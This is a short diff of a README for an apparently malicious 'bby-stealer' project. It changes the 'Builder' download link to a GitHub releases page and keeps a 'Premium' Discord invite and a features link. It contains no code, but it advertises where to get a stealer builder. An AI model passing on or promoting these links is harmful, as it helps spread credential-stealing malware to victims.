@@ -1,6 +1,6 @@
 
 
-#####  [:gem: Premium](https://discord.gg/RBnK3ny) - [🔧 Builder](https://github.com/Stanley-GF/Arizona) - [💡 Features](https://github.com/Ralstof/bby-stealer#features) 
+#####  [:gem: Premium](https://discord.gg/RBnK3ny) - [🔧 Builder](https://github.com/Ralstof/bbystealer/releases/tag/stealer) - [💡 Features](https://github.com/Ralstof/bby-stealer#features) 
 
 ### Authors
 - Ralstof#0001
